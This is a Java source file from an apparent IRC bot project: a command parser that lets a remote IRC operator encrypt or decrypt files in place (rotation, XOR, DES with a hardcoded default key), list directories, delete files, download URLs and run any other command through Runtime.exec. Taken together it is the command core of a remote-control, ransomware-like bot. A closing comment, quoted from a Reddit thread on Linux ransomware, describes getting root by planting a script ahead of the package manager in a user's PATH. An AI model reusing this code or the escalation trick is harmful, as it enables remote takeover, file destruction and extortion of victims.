/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ircbot;

import java.io.File;
import java.io.IOException;
import java.util.*;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

/**
 *
 * @author Chaos
 */
public class CommandParser {

    public static int parseCommand(String command) {    
        command = command.replace("!@", "");
        String[] cmds = {"cifraBinRot", "descifraBinRot",
            "cifraByteRot ", "descifraByteRot ",
            "cifraByteXOR", "descifraByteXOR",
            "cifraByteRotXOR", "descifraByteRotXOR",
            "cifraBinTransposicionInversa",
            "descifraBinTransposicionInversa",
            "cifraBinDes", "descifraBinDes",
            //new Commands
            "dir","rm","download","quit"
        };
        for (int i = 0; i < cmds.length; i++) {
            if (command.startsWith(cmds[i])) {
                return i;
            }
        }
        return -1;
    }

    /*
     Regresa el n-esimo param (contando de 1 a n) de un cmd {cmd} p1 ... pn
     donde p's son parametros separados por un espacio
     */
    public static String getParam(String cmd, int n) {
        ArrayList<String> params = getParams(cmd);
        if (n <= params.size()) {
            return params.get(n - 1);
        }
        return "";
    }

    /*
     Toma un comando {cmd} p1 p2 ... pn
     y regresa la lista con todos los parametros p
     (estos estan separados por espacios)
     */
    public static ArrayList<String> getParams(String cmd) {
        ArrayList<String> params = new ArrayList<String>();
        System.out.println("en getParams cmd input es "+cmd);
        cmd = cmd.substring(cmd.indexOf(" ") + 1) + " ";
        System.out.println("en getParams cmd despues es "+cmd);
        int idx1=cmd.indexOf("\"");
        int idx2=cmd.lastIndexOf("\"");
        String temp = "";
        for (int i = 0; i < cmd.length(); i++) {
            if (cmd.charAt(i) != ' ') {
                temp += cmd.charAt(i);
            } else {
                //si i>idx1 y i<idx2 no agrego a la lista
                //si la ruta tiene espacios
                if(i>idx1&&i<idx2){
                    temp+=cmd.charAt(i);
                }else{
                    params.add(temp);
                    temp = "";
                }
            }
        }
        return params;
    }

    public static int paramToInt(int rot, String param) {
        //if the param string represents  an Integer we return it,
        //else we return the default argument
        try {
            int n = Integer.parseInt(param);
            return n;
        } catch (Exception e) {
        }
        return rot;
    }

    //Este metodo es utilizado cuando la ruta del archivo tiene un espacio
    //Entonces la ruta debe ir entre comillas;
    public static String getFile(String cmd){
        if(cmd.contains("\""))
            return cmd.substring(cmd.indexOf("\"")+1,cmd.lastIndexOf("\""));
        return getParam(cmd,1);
    }
    
    public static String doCommand(String cmd) throws IOException, InterruptedException {
        int numcmd = parseCommand(cmd);
        String file = "";
        int rot;
        int clave;
        String pwd = "";
        //llave default (intento de ofuscacion :( )
        byte[] pbytes = {-43, 84, 112, -23, 115, -45, -8, -33};
        SecretKey key;
        file = getFile(cmd);
        System.out.println("numcd " + numcmd);
        System.out.println("cmd es " + cmd);
        System.out.println("en doCommand file es [" + file + "]");
        String res="";
        switch (numcmd) {
            case 0:
                return Cipherx.cifraBinRot(file, 4);
                //break;
            case 1:
                //file = getParam(cmd, 1);
                return Cipherx.descifraBinRot(file, 4);
                //break;
            case 2:
                //the init value is the first arg
                rot = paramToInt(8, getParam(cmd, 2));
                System.out.println("cifraByteRot\narchivo " + file + "\nrot " + rot);
                System.out.println("cifraByteRot(" + file + "," + rot + ");");
                //aqui llamo a cifraByteRot
                return Cipherx.cifraByteRot(file, rot);
            case 3:
                //we have to check for file
                rot = paramToInt(8, getParam(cmd, 2));
                return Cipherx.descifraByteRot(file, rot);
            case 4:
                clave = paramToInt(8, getParam(cmd, 2));
                System.out.println("cifraByteXOR\narchivo " + file + "\nclave " + clave);
                return Cipherx.cifraByteXOR(file, clave);
                //break;
            //descifraByteXOR
            case 5:
                clave = paramToInt(8, getParam(cmd, 2));
                System.out.println("descifraByteXOR\narchivo " + file + "\nclave " + clave);
                return Cipherx.descifraByteXOR(file, clave);
            //cifraByteRotXOR rot clave
            case 6:
                rot = paramToInt(8, getParam(cmd, 2));
                clave = paramToInt(8, getParam(cmd, 3));
                System.out.println("cifraByteRotXOR\n"
                        + file + "\n" + rot + "\n" + clave);
                return Cipherx.cifraByteRotXOR(file, rot, clave);
                //break;
            //descifraByteRotXOR rot clave
            case 7:
                rot = paramToInt(8, getParam(cmd, 2));
                clave = paramToInt(8, getParam(cmd, 3));
                System.out.println("descifraByteRotXOR\n"
                        + file + "\n" + rot + "\n" + clave);
                return Cipherx.descifraByteRotXOR(file, rot, clave);
                //break;
            //cifraTransInversa
            case 8:
                System.out.println("CifraTransInversa " + file);
                return Cipherx.cifraTransposicionInversa(file);
            //descifraBinTransposicionInversa"
            case 9:
                System.out.println("desCifraTransInversa " + file);
                return Cipherx.descifraTransposicionInversa(file);
                //break;
            //cifraBinDEs
            case 10:
                pwd = getParam(cmd, 2);
                System.out.println("pwd es "+pwd);
                if (pwd.length() >= 8) {
                    pwd=Cipherx.fixPass(pwd);
                    pbytes = pwd.getBytes();
                }
                key = new SecretKeySpec(pbytes, "DES");
                System.out.println("cifraBinDEs " + file + "\n" + new String(pbytes));
                return Cipherx.cifraArchivosDES(file, key);
                //break;
            //descifraBinDes
            case 11:
                pwd = getParam(cmd, 2);
                System.out.println("pwd es "+pwd);
                if (pwd.length() >= 8) {
                    pwd=Cipherx.fixPass(pwd);
                    pbytes = pwd.getBytes();
                }
                key = new SecretKeySpec(pbytes, "DES");
                System.out.println("descifraBinDEs " + file + "\n" + new String(pbytes));
                return Cipherx.descifraArchivoDES(file, key);
                //break;
            //dir
            //WORKS
            case 12:
                File currentDir = new File("");
                String dir=currentDir.getAbsolutePath();
                if(getFile(cmd).length()>1)
                    dir=new File(getFile(cmd)).getAbsolutePath();
                System.out.println("El dir en dir es "+dir);
                return "Files @"+dir+": "+Archivos.list(dir);
                //break;
            case 13:
                file="";
                if(getParam(cmd,1).length()>1){
                    file=getParam(cmd,1);
                    System.out.println("doCommand@rm file es "+file);
                    return Archivos.delete(file);
                }
                //break;
            //download
            case 14:
                if(getParam(cmd,1).length()>1){
                    String url=getParam(cmd,1);
                    if(getParam(cmd,2).length()>1){
                        file=getParam(cmd,2);
                        return Archivos.download(url,file);
                    }
                }
            break;
            //quit
            case 15:
                return IRC.quitIRC();
            default:
                CommandParser.execute(cmd);
                System.out.println(cmd + " not found!");
                break;
        }
        return res;
    }

    //Aqui defino el metodo que se utiliza de Command
    public static String execute(String cmd) {
        String temp = cmd+" results:";
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            Scanner kb = new Scanner(process.getInputStream());
            while (kb.hasNextLine()) {
                temp += kb.nextLine() + ",  ";
            }
        } catch (IOException e) {
            System.out.println("error executing "+cmd+" "+ e.getMessage());
        }
        System.out.println(temp);
        return temp;
    }
    
    public static void main(String[] args) throws IOException, InterruptedException {
    }
}


/*

 Source: https://www.reddit.com/r/netsec/comments/3s9adw/linux_ransomware_debut_fails_on_predictable/
 You don't need root to fuck up your home directory
 Not that hard to escalate from there. Add a script
 into the PATH for the user (bashrc, zshrc, whatever), 
 have it in front of apt-get/yum/pacman/etc, then wait 
 until the next run for su powers in order to fuck shit up.
 */
